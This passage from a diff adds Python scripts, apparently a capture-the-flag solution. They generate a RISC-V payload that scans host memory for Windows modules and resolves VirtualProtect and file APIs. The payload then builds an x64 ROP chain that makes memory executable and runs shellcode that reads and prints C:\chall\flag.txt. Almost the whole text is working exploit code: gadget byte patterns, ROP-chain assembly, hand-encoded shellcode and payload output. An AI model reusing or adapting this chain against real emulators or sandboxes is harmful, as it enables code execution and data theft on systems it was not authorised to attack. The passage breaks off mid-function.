+    add_large(a, S5, S5, -0x10000)
+    a.jal(X0, f&quot;{prefix}_ret_base_scan&quot;)
+
+
+def emit_universal_stack_discovery(a):
+    auipc(a, S0, 0)
+    addi(a, S0, S0, -0x110)
+
+    srli(a, S2, S0, 16)
+    slli(a, S2, S2, 16)
+    add_large(a, S11, S2, -0x7000)
+    add_large(a, S6, S2, -0x1000)
+
+    a.label(&quot;stack_candidate&quot;)
+    a.branch(&quot;bgeu&quot;, S11, S6, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, S1, S11, 0)
+    addi(a, S11, S11, 8)
+
+    srli(a, T0, S1, 36)
+    a.branch(&quot;beq&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 44)
+    a.branch(&quot;bne&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 3)
+    slli(a, T0, T0, 3)
+    a.branch(&quot;bne&quot;, T0, S1, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 40)
+    li(a, T1, 0x7F)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    srli(a, S1, S1, 12)
+    slli(a, S1, S1, 12)
+    srli(a, T0, S1, 32)
+    srli(a, T1, S2, 32)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    add_large(a, T0, S2, -0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;candidate_page_ok&quot;)
+    add_large(a, T0, S2, 0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;stack_candidate&quot;)
+
+    a.label(&quot;candidate_page_ok&quot;)
+    add(a, S3, S1, X0)
+    add_large(a, S4, S1, 0x1000)
+
+    a.label(&quot;stack_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S3, S4, &quot;stack_candidate&quot;)
+
+    # Preferred local/expected frame shape: ctx, native return address, ctx.
+    load(a, &quot;ld&quot;, T4, S3, -8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;try_forward_frame&quot;)
+    load(a, &quot;ld&quot;, T4, S3, 8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;try_forward_frame&quot;)
+    load(a, &quot;ld&quot;, T0, S3, 0)
+    srli(a, T2, T0, 40)
+    li(a, T3, 0x7F)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;try_forward_frame&quot;)
+    add(a, S6, S3, X0)
+    find_module_base_from_ret(a, &quot;back&quot;)
+
+    # Alternate shape: ctx, native return address, ctx starting at cursor.
+    a.label(&quot;try_forward_frame&quot;)
+    load(a, &quot;ld&quot;, T4, S3, 0)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T4, S3, 16)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T0, S3, 8)
+    srli(a, T2, T0, 40)
+    li(a, T3, 0x7F)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_stack&quot;)
+    addi(a, S6, S3, 8)
+    find_module_base_from_ret(a, &quot;fwd&quot;)
+
+    a.label(&quot;next_stack&quot;)
+    addi(a, S3, S3, 8)
+    a.jal(X0, &quot;stack_scan&quot;)
+
+    a.label(&quot;found_stack&quot;)
+
+
+def compare_c_name(a, ptr_reg, name, fail_label):
+    raw = name.encode(&quot;ascii&quot;)
+    off = 0
+    while off + 4 &lt;= len(raw):
+        load(a, &quot;lwu&quot;, T0, ptr_reg, off)
+        li(a, T1, int.from_bytes(raw[off : off + 4], &quot;little&quot;))
+        a.branch(&quot;bne&quot;, T0, T1, fail_label)
+        off += 4
+    if off + 2 &lt;= len(raw):
+        load(a, &quot;lhu&quot;, T0, ptr_reg, off)
+        li(a, T1, int.from_bytes(raw[off : off + 2], &quot;little&quot;))
+        a.branch(&quot;bne&quot;, T0, T1, fail_label)
+        off += 2
+    if off &lt; len(raw):
+        load(a, &quot;lbu&quot;, T0, ptr_reg, off)
+        li(a, T1, raw[off])
+        a.branch(&quot;bne&quot;, T0, T1, fail_label)
+        off += 1
+    load(a, &quot;lbu&quot;, T0, ptr_reg, off)
+    a.branch(&quot;bne&quot;, T0, X0, fail_label)
+
+
+def emit_find_export(a, name, dst_off):
+    safe = &quot;&quot;.join(ch if ch.isalnum() else &quot;_&quot; for ch in name)
+    add_large(a, S10, S2, -0x10000)
+    add(a, S11, S2, X0)
+
+    a.label(f&quot;{safe}_module_loop&quot;)
+    a.branch(&quot;bgeu&quot;, S10, S11, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, A4, S10, 0)
+    addi(a, S10, S10, 8)
+    srli(a, A5, A4, 16)
+    slli(a, A5, A5, 16)
+    a.branch(&quot;bne&quot;, A4, A5, f&quot;{safe}_module_loop&quot;)
+    srli(a, A5, A4, 40)
+    li(a, A6, 0x7F)
+    a.branch(&quot;bne&quot;, A5, A6, f&quot;{safe}_module_loop&quot;)
+    load(a, &quot;lhu&quot;, A5, A4, 0)
+    li(a, A6, 0x5A4D)
+    a.branch(&quot;bne&quot;, A5, A6, f&quot;{safe}_module_loop&quot;)
+    load(a, &quot;lwu&quot;, A5, A4, 0x3C)
+    li(a, A6, 0x1000)
+    a.branch(&quot;bgeu&quot;, A5, A6, f&quot;{safe}_module_loop&quot;)
+    add(a, A6, A4, A5)
+    load(a, &quot;lwu&quot;, A5, A6, 0)
+    li(a, A7, 0x4550)
+    a.branch(&quot;bne&quot;, A5, A7, f&quot;{safe}_module_loop&quot;)
+    load(a, &quot;lwu&quot;, A5, A6, 0x50)
+    li(a, A7, 0x1000)
+    a.branch(&quot;bltu&quot;, A5, A7, f&quot;{safe}_module_loop&quot;)
+    li(a, A7, 0x4000000)
+    a.branch(&quot;bltu&quot;, A7, A5, f&quot;{safe}_module_loop&quot;)
+
+    load(a, &quot;lwu&quot;, A0, A6, 0x88)  # export RVA
+    a.branch(&quot;beq&quot;, A0, X0, f&quot;{safe}_module_loop&quot;)
+    load(a, &quot;lwu&quot;, A1, A6, 0x8C)  # export size
+    add(a, A2, A4, A0)            # export dir
+    load(a, &quot;lwu&quot;, A3, A2, 0x18)  # NumberOfNames
+    li(a, T0, 0x20000)
+    a.branch(&quot;bltu&quot;, T0, A3, f&quot;{safe}_module_loop&quot;)
+    load(a, &quot;lwu&quot;, S7, A2, 0x20)  # AddressOfNames
+    add(a, S7, A4, S7)
+    load(a, &quot;lwu&quot;, S8, A2, 0x24)  # AddressOfNameOrdinals
+    add(a, S8, A4, S8)
+    load(a, &quot;lwu&quot;, S5, A2, 0x1C)  # AddressOfFunctions
+    add(a, S5, A4, S5)
+    addi(a, A5, X0, 0)
+
+    a.label(f&quot;{safe}_name_loop&quot;)
+    a.branch(&quot;bgeu&quot;, A5, A3, f&quot;{safe}_module_loop&quot;)
+    slli(a, A6, A5, 2)
+    add(a, A6, S7, A6)
+    load(a, &quot;lwu&quot;, A6, A6, 0)
+    add(a, A6, A4, A6)
+    compare_c_name(a, A6, name, f&quot;{safe}_next_name&quot;)
+
+    slli(a, A6, A5, 1)
+    add(a, A6, S8, A6)
+    load(a, &quot;lhu&quot;, A6, A6, 0)
+    slli(a, A6, A6, 2)
+    add(a, A6, S5, A6)
+    load(a, &quot;lwu&quot;, A6, A6, 0)
+
+    # Skip forwarded exports; another module should expose the real code.
+    a.branch(&quot;bltu&quot;, A6, A0, f&quot;{safe}_not_forwarded&quot;)
+    add(a, T0, A0, A1)
+    a.branch(&quot;bltu&quot;, A6, T0, f&quot;{safe}_next_name&quot;)
+
+    a.label(f&quot;{safe}_not_forwarded&quot;)
+    add(a, A6, A4, A6)
+    store_at_ctx(a, A6, dst_off)
+    a.jal(X0, f&quot;found_{safe}&quot;)
+
+    a.label(f&quot;{safe}_next_name&quot;)
+    addi(a, A5, A5, 1)
+    a.jal(X0, f&quot;{safe}_name_loop&quot;)
+
+    a.label(f&quot;found_{safe}&quot;)
+
+
+def emit_find_shell_gadgets(a, layout):
+    add_large(a, S10, S2, -0x10000)
+    add(a, S11, S2, X0)
+
+    a.label(&quot;gadget_module_loop&quot;)
+    a.branch(&quot;bgeu&quot;, S10, S11, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, A4, S10, 0)
+    addi(a, S10, S10, 8)
+    srli(a, A5, A4, 16)
+    slli(a, A5, A5, 16)
+    a.branch(&quot;bne&quot;, A4, A5, &quot;gadget_module_loop&quot;)
+    srli(a, A5, A4, 40)
+    li(a, A6, 0x7F)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;gadget_module_loop&quot;)
+    load(a, &quot;lhu&quot;, A5, A4, 0)
+    li(a, A6, 0x5A4D)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;gadget_module_loop&quot;)
+    load(a, &quot;lwu&quot;, A5, A4, 0x3C)
+    li(a, A6, 0x1000)
+    a.branch(&quot;bgeu&quot;, A5, A6, &quot;gadget_module_loop&quot;)
+    add(a, A6, A4, A5)
+    load(a, &quot;lwu&quot;, A5, A6, 0)
+    li(a, A7, 0x4550)
+    a.branch(&quot;bne&quot;, A5, A7, &quot;gadget_module_loop&quot;)
+
+    parse_first_section(a, A4, A0, A1)
+    scan_pattern(
+        a,
+        &quot;find_pop_r8_module&quot;,
+        A0,
+        A1,
+        bytes.fromhex(&quot;41 58 48 8b c1 c3&quot;),
+        SLOT_POP_R8,
+        layout,
+        &quot;gadget_module_loop&quot;,
+        found_label=&quot;found_gadget_module&quot;,
+    )
+
+    a.label(&quot;found_gadget_module&quot;)
+    add(a, S7, A4, X0)
+    scan_pattern(a, &quot;univ_pop_rcx&quot;, A0, A1, bytes.fromhex(&quot;59 c3&quot;), SLOT_POP_RCX, layout, &quot;fail&quot;)
+    load_from_ctx(a, T0, layout[&quot;slot_base&quot;] + SLOT_POP_RCX)
+    addi(a, T0, T0, 1)
+    store_at_ctx(a, T0, layout[&quot;slot_base&quot;] + SLOT_RET_ALIGN)
+    scan_pattern(a, &quot;univ_pop_rdx&quot;, A0, A1, bytes.fromhex(&quot;5a c3&quot;), SLOT_POP_RDX, layout, &quot;fail&quot;)
+
+
+def build(layout, labels, spin_after_write=False):
+    a = Asm()
+    emit_universal_stack_discovery(a)
+    emit_find_shell_gadgets(a, layout)
+
+    r9_patterns = {
+        1: bytes.fromhex(&quot;41 59 c3&quot;),
+        2: bytes.fromhex(&quot;41 59 41 5a c3&quot;),
+        3: bytes.fromhex(&quot;41 59 41 5a 41 5b c3&quot;),
+    }
+    emit_find_gadget_in_modules(a, &quot;univ_pop_r9&quot;, r9_patterns[layout[&quot;r9_pops&quot;]], SLOT_POP_R9_R10_R11, layout)
+    emit_find_export(a, &quot;VirtualProtect&quot;, layout[&quot;slot_base&quot;] + SLOT_VIRTUALPROTECT)
+
+    shell = layout[&quot;shell&quot;]
+    for func in [&quot;CreateFileW&quot;, &quot;ReadFile&quot;, &quot;GetStdHandle&quot;, &quot;WriteFile&quot;]:
+        emit_find_export(a, func, shell + labels[f&quot;p{func}&quot;])
+
+    emit_rop(a, layout)
+
+    a.label(&quot;fail&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;fail&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    a.label(&quot;trigger&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;trigger&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    return a.resolve()
+
+
+def main():
+    shellcode, labels = build_shellcode()
+    layout = {
+        &quot;slot_base&quot;: int(os.environ.get(&quot;UNIV_SLOT_BASE&quot;, &quot;0x3000&quot;), 0),
+        &quot;oldprotect&quot;: int(os.environ.get(&quot;UNIV_OLDPROTECT&quot;, &quot;0x3f00&quot;), 0),
+        &quot;shell&quot;: int(os.environ.get(&quot;UNIV_SHELL&quot;, &quot;0x4000&quot;), 0),
+        &quot;r9_pops&quot;: int(os.environ.get(&quot;UNIV_R9_POPS&quot;, &quot;3&quot;), 0),
+    }
+    payload = build(layout, labels, spin_after_write=os.environ.get(&quot;SPIN_AFTER_WRITE&quot;) == &quot;1&quot;)
+    shell_file_off = layout[&quot;shell&quot;] - 0x110
+    if len(payload) &gt; shell_file_off:
+        raise SystemExit(f&quot;shell offset overlaps RISC-V code: code={len(payload)} shell_file_off={shell_file_off}&quot;)
+    payload += b&quot;\x13\x00\x00\x00&quot; * ((shell_file_off - len(payload)) // 4)
+    payload += b&quot;\x00&quot; * ((shell_file_off - len(payload)) % 4)
+    payload += shellcode
+
+    stem = os.environ.get(&quot;UNIV_OUT&quot;, f&quot;real_universal_r9_{layout[&#x27;r9_pops&#x27;]}&quot;)
+    out = Path(&quot;sol&quot;)
+    out.mkdir(exist_ok=True)
+    (out / f&quot;{stem}.bin&quot;).write_bytes(payload)
+    (out / f&quot;{stem}.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;r9_pops={layout[&#x27;r9_pops&#x27;]}&quot;)
+    print(f&quot;shellcode={len(shellcode)} bytes&quot;)
+    print(f&quot;wrote {out / (stem + &#x27;.bin&#x27;)} ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote {out / (stem + &#x27;.b64&#x27;)} ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>make_real_vp_shell.py</span><span class="meta">13,016 bytes / SHA256 39D1AF1E5A7C93BB...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import os
+import struct
+from pathlib import Path
+
+from make_real_rop import (
+    A0,
+    A1,
+    A2,
+    A3,
+    A4,
+    A5,
+    A6,
+    A7,
+    S0,
+    S2,
+    S4,
+    S5,
+    S6,
+    S7,
+    S8,
+    S10,
+    S11,
+    T0,
+    T1,
+    T2,
+    T3,
+    T4,
+    T5,
+    T6,
+    X0,
+    Asm,
+    add,
+    add_large,
+    addi,
+    auipc,
+    li,
+    load,
+    srli,
+    slli,
+    store,
+    store_const,
+    store_inc,
+    sub,
+)
+from make_real_rop_dynamic import (
+    SLOT_POP_R9_R10_R11,
+    SLOT_POP_R8,
+    SLOT_POP_RCX,
+    SLOT_POP_RDX,
+    SLOT_RET_ALIGN,
+    emit_common_discovery,
+    parse_first_section,
+    scan_pattern,
+)
+
+
+SLOT_VIRTUALPROTECT = 0x38
+
+
+class X64:
+    def __init__(self):
+        self.buf = bytearray()
+        self.labels = {}
+        self.fixups = []
+
+    def label(self, name):
+        self.labels[name] = len(self.buf)
+
+    def emit(self, data):
+        self.buf.extend(data)
+
+    def u32(self, val):
+        self.emit(struct.pack(&quot;&lt;I&quot;, val &amp; 0xFFFFFFFF))
+
+    def u64(self, val):
+        self.emit(struct.pack(&quot;&lt;Q&quot;, val &amp; 0xFFFFFFFFFFFFFFFF))
+
+    def rip(self, opcode, label):
+        self.emit(opcode)
+        self.fixups.append((len(self.buf), label))
+        self.u32(0)
+
+    def resolve(self):
+        out = bytearray(self.buf)
+        for off, label in self.fixups:
+            disp = self.labels[label] - (off + 4)
+            struct.pack_into(&quot;&lt;i&quot;, out, off, disp)
+        return bytes(out), self.labels
+
+
+def mov_qword_rsp(x, off, imm):
+    x.emit(b&quot;\x48\xc7\x44\x24&quot; + bytes([off &amp; 0xFF]) + struct.pack(&quot;&lt;I&quot;, imm &amp; 0xFFFFFFFF))
+
+
+def build_shellcode():
+    x = X64()
+
+    x.emit(b&quot;\x48\x89\xe5&quot;)                  # mov rbp, rsp
+    x.emit(b&quot;\x48\x83\xe4\xf0&quot;)              # and rsp, -16
+    x.emit(b&quot;\x48\x81\xec\x90\x00\x00\x00&quot;)  # sub rsp, 0x90
+
+    # CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
+    x.rip(b&quot;\x48\x8d\x0d&quot;, &quot;path&quot;)           # lea rcx, [rip+path]
+    x.emit(b&quot;\xba\x00\x00\x00\x80&quot;)          # mov edx, 0x80000000
+    x.emit(b&quot;\x41\xb8\x01\x00\x00\x00&quot;)      # mov r8d, 1
+    x.emit(b&quot;\x45\x31\xc9&quot;)                  # xor r9d, r9d
+    mov_qword_rsp(x, 0x20, 3)
+    mov_qword_rsp(x, 0x28, 0x80)
+    mov_qword_rsp(x, 0x30, 0)
+    x.rip(b&quot;\x48\x8b\x05&quot;, &quot;pCreateFileW&quot;)
+    x.emit(b&quot;\xff\xd0&quot;)                      # call rax
+    x.emit(b&quot;\x48\x89\xc3&quot;)                  # mov rbx, rax
+
+    # ReadFile(handle, buffer, 0x100, &amp;bytes_read, NULL)
+    x.emit(b&quot;\x48\x89\xd9&quot;)                  # mov rcx, rbx
+    x.rip(b&quot;\x48\x8d\x15&quot;, &quot;buffer&quot;)         # lea rdx, [rip+buffer]
+    x.emit(b&quot;\x41\xb8\x00\x01\x00\x00&quot;)      # mov r8d, 0x100
+    x.rip(b&quot;\x4c\x8d\x0d&quot;, &quot;bytes_read&quot;)     # lea r9, [rip+bytes_read]
+    mov_qword_rsp(x, 0x20, 0)
+    x.rip(b&quot;\x48\x8b\x05&quot;, &quot;pReadFile&quot;)
+    x.emit(b&quot;\xff\xd0&quot;)
+
+    # stdout = GetStdHandle(STD_OUTPUT_HANDLE)
+    x.emit(b&quot;\xb9\xf5\xff\xff\xff&quot;)          # mov ecx, -11
+    x.rip(b&quot;\x48\x8b\x05&quot;, &quot;pGetStdHandle&quot;)
+    x.emit(b&quot;\xff\xd0&quot;)
+
+    # WriteFile(stdout, buffer, 0x100, &amp;bytes_written, NULL)
+    x.emit(b&quot;\x48\x89\xc1&quot;)                  # mov rcx, rax
+    x.rip(b&quot;\x48\x8d\x15&quot;, &quot;buffer&quot;)
+    x.emit(b&quot;\x41\xb8\x00\x01\x00\x00&quot;)
+    x.rip(b&quot;\x4c\x8d\x0d&quot;, &quot;bytes_written&quot;)
+    mov_qword_rsp(x, 0x20, 0)
+    x.rip(b&quot;\x48\x8b\x05&quot;, &quot;pWriteFile&quot;)
+    x.emit(b&quot;\xff\xd0&quot;)
+    x.emit(b&quot;\xcc&quot;)                          # crash after captured output
+
+    while len(x.buf) % 8:
+        x.emit(b&quot;\x90&quot;)
+
+    x.label(&quot;pCreateFileW&quot;)
+    x.u64(0)
+    x.label(&quot;pReadFile&quot;)
+    x.u64(0)
+    x.label(&quot;pGetStdHandle&quot;)
+    x.u64(0)
+    x.label(&quot;pWriteFile&quot;)
+    x.u64(0)
+    x.label(&quot;bytes_read&quot;)
+    x.u64(0)
+    x.label(&quot;bytes_written&quot;)
+    x.u64(0)
+    x.label(&quot;path&quot;)
+    x.emit(&quot;C:\\chall\\flag.txt&quot;.encode(&quot;utf-16le&quot;) + b&quot;\x00\x00&quot;)
+    while len(x.buf) % 16:
+        x.emit(b&quot;\x00&quot;)
+    x.label(&quot;buffer&quot;)
+    x.emit(b&quot;\x00&quot; * 0x180)
+
+    return x.resolve()
+
+
+def store_at_ctx(a, src, off):
+    add_large(a, T6, S0, off)
+    store(a, &quot;sd&quot;, src, T6, 0)
+
+
+def load_from_ctx(a, dst, off):
+    add_large(a, T6, S0, off)
+    load(a, &quot;ld&quot;, dst, T6, 0)
+
+
+def store_ctx_slot_inc(a, base_off, slot_off):
+    load_from_ctx(a, T0, base_off + slot_off)
+    store_inc(a, T0)
+
+
+def emit_find_module_from_iat(a, iat_rva):
+    add_large(a, T0, S5, iat_rva)
+    load(a, &quot;ld&quot;, S10, T0, 0)
+    srli(a, S10, S10, 16)
+    slli(a, S10, S10, 16)
+
+    a.label(&quot;kernel_base_scan&quot;)
+    load(a, &quot;lhu&quot;, T0, S10, 0)
+    li(a, T1, 0x5A4D)
+    a.branch(&quot;bne&quot;, T0, T1, &quot;prev_kernel_base&quot;)
+    load(a, &quot;lwu&quot;, T0, S10, 0x3C)
+    li(a, T1, 0x1000)
+    a.branch(&quot;bgeu&quot;, T0, T1, &quot;prev_kernel_base&quot;)
+    add(a, T1, S10, T0)
+    load(a, &quot;lwu&quot;, T2, T1, 0)
+    li(a, T3, 0x4550)
+    a.branch(&quot;beq&quot;, T2, T3, &quot;found_kernel_base&quot;)
+
+    a.label(&quot;prev_kernel_base&quot;)
+    add_large(a, S10, S10, -0x10000)
+    a.jal(X0, &quot;kernel_base_scan&quot;)
+
+    a.label(&quot;found_kernel_base&quot;)
+
+
+def emit_find_virtualprotect(a, layout):
+    emit_find_module_from_iat(a, 0x2000)  # ReadFile resolves into the kernel API module.
+
+    load(a, &quot;lwu&quot;, T0, S10, 0x3C)
+    add(a, T1, S10, T0)
+    load(a, &quot;lwu&quot;, T2, T1, 0x88)  # export directory RVA
+    a.branch(&quot;beq&quot;, T2, X0, &quot;fail&quot;)
+    add(a, A0, S10, T2)           # export directory
+    load(a, &quot;lwu&quot;, A1, A0, 0x18)  # NumberOfNames
+    load(a, &quot;lwu&quot;, A2, A0, 0x20)  # AddressOfNames
+    add(a, A2, S10, A2)
+    load(a, &quot;lwu&quot;, A3, A0, 0x24)  # AddressOfNameOrdinals
+    add(a, A3, S10, A3)
+    load(a, &quot;lwu&quot;, A4, A0, 0x1C)  # AddressOfFunctions
+    add(a, A4, S10, A4)
+    addi(a, A5, X0, 0)
+
+    a.label(&quot;export_name_loop&quot;)
+    a.branch(&quot;bgeu&quot;, A5, A1, &quot;fail&quot;)
+    slli(a, A6, A5, 2)
+    add(a, A6, A2, A6)
+    load(a, &quot;lwu&quot;, A6, A6, 0)
+    add(a, A6, S10, A6)
+
+    load(a, &quot;lwu&quot;, T0, A6, 0)
+    li(a, T1, 0x74726956)  # Virt
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_export_name&quot;)
+    load(a, &quot;lwu&quot;, T0, A6, 4)
+    li(a, T1, 0x506C6175)  # ualP
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_export_name&quot;)
+    load(a, &quot;lwu&quot;, T0, A6, 8)
+    li(a, T1, 0x65746F72)  # rote
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_export_name&quot;)
+    load(a, &quot;lhu&quot;, T0, A6, 12)
+    li(a, T1, 0x7463)      # ct
+    a.branch(&quot;bne&quot;, T0, T1, &quot;next_export_name&quot;)
+    load(a, &quot;lbu&quot;, T0, A6, 14)
+    a.branch(&quot;bne&quot;, T0, X0, &quot;next_export_name&quot;)
+
+    slli(a, A6, A5, 1)
+    add(a, A6, A3, A6)
+    load(a, &quot;lhu&quot;, A6, A6, 0)
+    slli(a, A6, A6, 2)
+    add(a, A6, A4, A6)
+    load(a, &quot;lwu&quot;, A6, A6, 0)
+    add(a, A6, S10, A6)
+    store_at_ctx(a, A6, layout[&quot;slot_base&quot;] + SLOT_VIRTUALPROTECT)
+    a.jal(X0, &quot;found_virtualprotect&quot;)
+
+    a.label(&quot;next_export_name&quot;)
+    addi(a, A5, A5, 1)
+    a.jal(X0, &quot;export_name_loop&quot;)
+
+    a.label(&quot;found_virtualprotect&quot;)
+
+
+def emit_find_gadget_in_modules(a, name, pattern, slot_off, layout, fail_label=&quot;fail&quot;):
+    add_large(a, S10, S2, -0xC000)
+    add(a, S8, S2, X0)
+
+    a.label(f&quot;{name}_module_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S10, S8, fail_label)
+    load(a, &quot;ld&quot;, A4, S10, 0)
+    addi(a, S10, S10, 8)
+    srli(a, A5, A4, 16)
+    slli(a, A5, A5, 16)
+    a.branch(&quot;bne&quot;, A4, A5, f&quot;{name}_module_scan&quot;)
+    srli(a, A5, A4, 40)
+    li(a, A6, 0x7F)
+    a.branch(&quot;bne&quot;, A5, A6, f&quot;{name}_module_scan&quot;)
+    load(a, &quot;lhu&quot;, A5, A4, 0)
+    li(a, A6, 0x5A4D)
+    a.branch(&quot;bne&quot;, A5, A6, f&quot;{name}_module_scan&quot;)
+    load(a, &quot;lwu&quot;, A5, A4, 0x3C)
+    li(a, A6, 0x1000)
+    a.branch(&quot;bgeu&quot;, A5, A6, f&quot;{name}_module_scan&quot;)
+    add(a, A6, A4, A5)
+    load(a, &quot;lwu&quot;, A5, A6, 0)
+    li(a, A7, 0x4550)
+    a.branch(&quot;bne&quot;, A5, A7, f&quot;{name}_module_scan&quot;)
+    load(a, &quot;lwu&quot;, A5, A6, 0x50)
+    li(a, A7, 0x1000)
+    a.branch(&quot;bltu&quot;, A5, A7, f&quot;{name}_module_scan&quot;)
+    li(a, A7, 0x4000000)
+    a.branch(&quot;bltu&quot;, A7, A5, f&quot;{name}_module_scan&quot;)
+
+    parse_first_section(a, A4, A2, A3)
+    scan_pattern(
+        a,
+        name,
+        A2,
+        A3,
+        pattern,
+        slot_off,
+        layout,
+        f&quot;{name}_module_scan&quot;,
+        found_label=f&quot;found_{name}&quot;,
+    )
+
+    a.label(f&quot;found_{name}&quot;)
+
+
+def emit_gadget_discovery(a, layout):
+    parse_first_section(a, S7, A0, A1)
+    scan_pattern(a, &quot;vp_pop_rcx&quot;, A0, A1, bytes.fromhex(&quot;59 c3&quot;), SLOT_POP_RCX, layout, &quot;fail&quot;)
+    stage_gate(a, layout, &quot;pop_rcx&quot;)
+    load_from_ctx(a, T0, layout[&quot;slot_base&quot;] + SLOT_POP_RCX)
+    addi(a, T0, T0, 1)
+    store_at_ctx(a, T0, layout[&quot;slot_base&quot;] + SLOT_RET_ALIGN)
+    scan_pattern(a, &quot;vp_pop_rdx&quot;, A0, A1, bytes.fromhex(&quot;5a c3&quot;), SLOT_POP_RDX, layout, &quot;fail&quot;)
+    stage_gate(a, layout, &quot;pop_rdx&quot;)
+
+    r9_patterns = {
+        1: bytes.fromhex(&quot;41 59 c3&quot;),
+        2: bytes.fromhex(&quot;41 59 41 5a c3&quot;),
+        3: bytes.fromhex(&quot;41 59 41 5a 41 5b c3&quot;),
+    }
+    r9_pattern = r9_patterns[layout[&quot;r9_pops&quot;]]
+    scan_pattern(a, &quot;vp_pop_r9_shell&quot;, A0, A1, r9_pattern, SLOT_POP_R9_R10_R11, layout, &quot;try_vp_pop_r9_kernel&quot;)
+    a.jal(X0, &quot;found_vp_pop_r9_any&quot;)
+    a.label(&quot;try_vp_pop_r9_kernel&quot;)
+    parse_first_section(a, S10, A2, A3)
+    scan_pattern(a, &quot;vp_pop_r9_kernel&quot;, A2, A3, r9_pattern, SLOT_POP_R9_R10_R11, layout, &quot;try_vp_pop_r9_modules&quot;)
+    a.jal(X0, &quot;found_vp_pop_r9_any&quot;)
+    a.label(&quot;try_vp_pop_r9_modules&quot;)
+    emit_find_gadget_in_modules(a, &quot;vp_pop_r9&quot;, r9_pattern, SLOT_POP_R9_R10_R11, layout)
+    a.label(&quot;found_vp_pop_r9_any&quot;)
+    stage_gate(a, layout, &quot;pop_r9&quot;)
+
+    scan_pattern(a, &quot;vp_pop_r8_alt&quot;, A0, A1, bytes.fromhex(&quot;41 58 48 8b c1 c3&quot;), SLOT_POP_R8, layout, &quot;fail&quot;)
+    stage_gate(a, layout, &quot;pop_r8&quot;)
+
+
+def emit_patch_shellcode_data(a, layout, labels):
+    shell = layout[&quot;shell&quot;]
+    for rva, label in [
+        (0x2020, &quot;pCreateFileW&quot;),
+        (0x2000, &quot;pReadFile&quot;),
+        (0x2010, &quot;pGetStdHandle&quot;),
+        (0x2018, &quot;pWriteFile&quot;),
+    ]:
+        add_large(a, T0, S5, rva)
+        load(a, &quot;ld&quot;, T0, T0, 0)
+        store_at_ctx(a, T0, shell + labels[label])
+
+
+def emit_rop(a, layout):
+    add(a, S4, S6, X0)
+    add_large(a, S8, S0, layout[&quot;shell&quot;])
+
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_RET_ALIGN)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R9_R10_R11)
+    add_large(a, T0, S0, layout[&quot;oldprotect&quot;])
+    store_inc(a, T0)
+    for _ in range(layout[&quot;r9_pops&quot;] - 1):
+        store_const(a, 0)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RCX)
+    store_inc(a, S8)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RDX)
+    store_const(a, 0x1000)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R8)
+    store_const(a, 0x40)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_VIRTUALPROTECT)
+    store_inc(a, S8)
+    for _ in range(4):
+        store_const(a, 0)
+    store_const(a, 0)
+    a.jal(X0, &quot;trigger&quot;)
+
+
+def stage_gate(a, layout, name):
+    if layout.get(&quot;spin_stage&quot;) != name:
+        return
+    a.label(f&quot;spin_stage_{name}&quot;)
+    a.jal(X0, f&quot;spin_stage_{name}&quot;)
+    addi(a, X0, X0, 0)
+
+
+def build(layout, labels, spin_after_write=False):
+    a = Asm()
+    emit_common_discovery(a)
+    stage_gate(a, layout, &quot;stack&quot;)
+    emit_find_virtualprotect(a, layout)
+    stage_gate(a, layout, &quot;virtualprotect&quot;)
+    emit_gadget_discovery(a, layout)
+    stage_gate(a, layout, &quot;gadgets&quot;)
+    emit_patch_shellcode_data(a, layout, labels)
+    stage_gate(a, layout, &quot;patch&quot;)
+    emit_rop(a, layout)
+    stage_gate(a, layout, &quot;rop&quot;)
+
+    a.label(&quot;fail&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;fail&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    a.label(&quot;trigger&quot;)
+    if spin_after_write:
